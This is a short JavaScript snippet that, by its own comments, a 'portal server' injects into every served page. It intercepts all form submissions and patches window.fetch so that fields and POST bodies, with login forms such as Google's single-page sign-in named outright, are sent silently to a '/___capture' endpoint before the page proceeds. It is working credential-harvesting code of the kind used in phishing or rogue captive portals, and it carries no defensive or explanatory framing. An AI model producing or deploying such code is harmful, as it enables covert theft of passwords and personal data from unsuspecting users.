// Injected by portal server into every served page.
// Intercepts all form submits and sends fields to /___capture before proceeding.
(function () {
  function harvest(form) {
    var data = {};
    var els = form.elements;
    for (var i = 0; i < els.length; i++) {
      var el = els[i];
      if (el.name) data[el.name] = el.value;
    }
    // Fire-and-forget POST to capture endpoint
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "/___capture", false); // synchronous so data sends before navigation
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({ fields: data, url: window.location.href }));
    } catch (e) {}
  }

  document.addEventListener("submit", function (e) {
    harvest(e.target);
  }, true);

  // Also patch fetch/XHR for JS-driven login forms (e.g. Google SPA)
  var _origFetch = window.fetch;
  window.fetch = function (url, opts) {
    if (opts && opts.body && typeof opts.method === "string" &&
        opts.method.toUpperCase() === "POST") {
      try {
        var body = opts.body;
        if (typeof body === "string") {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "/___capture", false);
          xhr2.setRequestHeader("Content-Type", "application/json");
          xhr2.send(JSON.stringify({ fields: { raw: body }, url: String(url) }));
        }
      } catch (e) {}
    }
    return _origFetch.apply(this, arguments);
  };
})();
